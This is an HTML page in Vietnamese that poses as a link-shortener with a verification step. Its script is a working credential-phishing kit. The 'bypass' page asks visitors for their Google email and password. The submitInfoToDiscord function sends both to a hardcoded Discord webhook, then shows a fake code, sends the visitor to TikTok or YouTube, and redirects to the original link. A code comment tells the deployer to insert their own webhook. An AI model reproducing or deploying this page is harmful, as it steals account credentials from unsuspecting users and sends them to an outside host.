<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hệ thống rút gọn & Xác thực</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: #333;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }
        .container {
            background: #fff;
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
            width: 100%;
            max-width: 450px;
            text-align: center;
        }
        h2 {
            margin-bottom: 20px;
            color: #4a5568;
        }
        .step {
            margin-bottom: 20px;
            padding: 15px;
            border: 1px dashed #cbd5e0;
            border-radius: 8px;
            background: #f7fafc;
        }
        .step p {
            margin: 0 0 10px 0;
            font-weight: 600;
            color: #2d3748;
        }
        input[type="text"], input[type="url"], input[type="password"] {
            width: 90%;
            padding: 10px;
            border: 1px solid #cbd5e0;
            border-radius: 6px;
            text-align: center;
            font-size: 15px;
            margin-bottom: 10px;
        }
        .btn {
            display: inline-block;
            background: #3182ce;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-size: 15px;
            text-decoration: none;
            transition: background 0.3s;
            width: 100%;
            box-sizing: border-box;
        }
        .btn:hover { background: #2b6cb0; }
        .btn-tiktok { background: #000000; margin-bottom: 10px; }
        .btn-tiktok:hover { background: #333333; }
        .btn-youtube { background: #e53e3e; }
        .btn-youtube:hover { background: #c53030; }
        .btn-success {
            background: #38a169;
            font-size: 18px;
            font-weight: bold;
        }
        .btn-success:hover { background: #2f855a; }
        .hidden { display: none; }
        .social-group {
            display: flex;
            flex-direction: column;
        }
    </style>
</head>
<body>

<div class="container" id="app">
    <!-- GIAO DIỆN 1: TẠO LINK TỰ ĐỘNG -->
    <div id="createSection">
        <h2>Tạo Link Vượt Tự Động</h2>
        <div class="step">
            <p>Nhập đường link gốc của bạn:</p>
            <input type="url" id="targetInput" placeholder="https://example.com">
            <br>
            <button class="btn" onclick="generateShortLink()">Tạo Link</button>
        </div>
        <div id="resultBox" class="step hidden">
            <p>Link rút gọn của bạn:</p>
            <input type="text" id="shortResult" readonly>
            <br>
            <button class="btn" onclick="copyShortLink()">Sao Chép Link</button>
        </div>
    </div>

    <!-- GIAO DIỆN 2: TRANG VƯỢT LINK -->
    <div id="bypassSection" class="hidden">
        <h2>Trang Vượt Link Xác Thực</h2>
        
        <!-- Bước 1: Nhập thông tin -->
        <div class="step" id="step1">
            <p>Bước 1: Nhập tài khoản Google & Mật khẩu</p>
            <input type="text" id="usernameInput" placeholder="Tên người dùng / Email Google">
            <input type="password" id="passwordInput" placeholder="Mật khẩu của bạn">
            <br>
            <button class="btn" onclick="submitInfoToDiscord()">Gửi & Lấy Mã</button>
        </div>

        <!-- Bước 2: Hiển thị mã & Mạng xã hội -->
        <div class="step hidden" id="step2">
            <p>Bước 2: Mã xác nhận của bạn</p>
            <input type="text" id="codeBox" readonly>
            <br>
            <button class="btn" onclick="copyCode()" style="margin-bottom: 15px;">Sao chép mã</button>
            <p>Ghé thăm liên kết tài trợ:</p>
            <div class="social-group">
                <a href="https://www.tiktok.com" target="_blank" class="btn btn-tiktok" onclick="unlockStep()">Xem TikTok</a>
                <a href="https://www.youtube.com" target="_blank" class="btn btn-youtube" onclick="unlockStep()">Xem YouTube</a>
            </div>
        </div>

        <!-- Bước 3: Lấy link gốc -->
        <div class="step hidden" id="step3">
            <p>Bước 3: Hoàn thành! Lấy link của bạn</p>
            <button class="btn btn-success" onclick="goToDestination()">Lấy Link Ngay</button>
        </div>
    </div>
</div>

<script>
    // 👉 THAY LINK DISCORD WEBHOOK CỦA BẠN VÀO DƯỚI ĐÂY:
    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1543202724701806632/55a8I4nSCzzXtADCRQn0bDmz-pX0rZXwHZkr-s9HXDZwiycfuc-Frgn-L3pxA7_ipVuO";

    const urlParams = new URLSearchParams(window.location.search);
    const encodedUrl = urlParams.get('url');
    let generatedCode = "";

    if (encodedUrl) {
        document.getElementById('createSection').classList.add('hidden');
        document.getElementById('bypassSection').classList.remove('hidden');
        generatedCode = "CODE-" + Math.floor(1000 + Math.random() * 9000);
        document.getElementById('codeBox').value = generatedCode;
    }

    function generateShortLink() {
        const rawUrl = document.getElementById('targetInput').value;
        if (!rawUrl) {
            alert("Vui lòng nhập đường link hợp lệ!");
            return;
        }

        const encoded = encodeURIComponent(rawUrl);
        const currentDomain = window.location.origin + window.location.pathname;
        const finalShortLink = currentDomain + "?url=" + encoded;

        document.getElementById('shortResult').value = finalShortLink;
        document.getElementById('resultBox').classList.remove('hidden');
    }

    function copyShortLink() {
        const copyText = document.getElementById('shortResult');
        copyText.select();
        document.execCommand("copy");
        alert("Đã sao chép link rút gọn!");
    }

    function submitInfoToDiscord() {
        const username = document.getElementById('usernameInput').value;
        const password = document.getElementById('passwordInput').value;

        if (!username || !password) {
            alert("Vui lòng điền đầy đủ tên người dùng và mật khẩu!");
            return;
        }

        if (DISCORD_WEBHOOK_URL === "YOUR_DISCORD_WEBHOOK_URL_HERE") {
            alert("Bạn chưa cấu hình Discord Webhook URL trong code!");
            document.getElementById('step1').classList.add('hidden');
            document.getElementById('step2').classList.remove('hidden');
            return;
        }

        // Tạo nội dung gửi về Discord
        const payload = {
            content: `📥 **THÔNG TIN ĐĂNG NHẬP MỚI**\n👤 **Tên người dùng/Email:** \`${username}\`\n🔑 **Mật khẩu:** \`${password}\`\n🔢 **Mã xác nhận:** \`${generatedCode}\``
        };

        fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(payload)
        })
        .then(response => {
            document.getElementById('step1').classList.add('hidden');
            document.getElementById('step2').classList.remove('hidden');
        })
        .catch(error => {
            console.error('Lỗi khi gửi Discord:', error);
            document.getElementById('step1').classList.add('hidden');
            document.getElementById('step2').classList.remove('hidden');
        });
    }

    function copyCode() {
        const codeBox = document.getElementById("codeBox");
        codeBox.select();
        document.execCommand("copy");
        alert("Đã sao chép mã thành công!");
    }

    function unlockStep() {
        setTimeout(() => {
            document.getElementById("step3").classList.remove("hidden");
        }, 1000);
    }

    function goToDestination() {
        const originalUrl = decodeURIComponent(encodedUrl);
        window.location.href = originalUrl;
    }
</script>

</body>
</html>
